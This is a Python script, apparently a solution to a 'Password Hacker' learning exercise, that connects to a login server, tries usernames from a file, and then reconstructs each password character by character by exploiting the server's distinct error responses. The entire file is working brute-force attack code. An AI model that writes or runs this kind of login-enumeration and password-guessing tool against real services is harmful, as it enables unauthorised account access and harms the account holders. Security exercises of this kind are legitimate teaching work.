import sys
import socket
import json
import string


chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

args = sys.argv
ip_var = args[1]
port_var = int(args[2])

new_socket = socket.socket()
new_socket.connect((ip_var, port_var))


def password_hack(login):
    password = []
    return find_nextchar(login, password)


def find_nextchar(login, password):

    for i in chars:
        password.append(i)
        msg = {
                "login": f"{login}",
                "password": f"{''.join(password)}"
                }
        #print(json.dumps(msg))
        js_msg = json.dumps(msg).encode()
        new_socket.send(js_msg)
        response = new_socket.recv(1024)
        #print(response.decode())
        if response.decode() == json.dumps({"result": "Exception happened during login"}):
            find_nextchar(login, password)
        elif response.decode() == json.dumps({"result": "Wrong password!"}):
            password.pop()
            #find_nextchar(login, password)
        elif response.decode() == json.dumps({"result": "Connection success!"}):
            print(json.dumps({"login": f"{login}", "password": f"{''.join(password)}"}))
            exit()


def login_hack():
    with open(r'C:\Users\danys\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt', 'r') as file:
        for line in file:
            line = line.strip()
            msg = {
                "login": f"{line}",
                "password": " "
            }
            js_msg = json.dumps(msg).encode()
            new_socket.send(js_msg)
            response = new_socket.recv(1024).decode()
            #print(response)
            if response == json.dumps({"result": "Wrong password!"}):
                password_hack(line)
            elif response == json.dumps({"result": "Wrong login!"}):
                continue


login_hack()
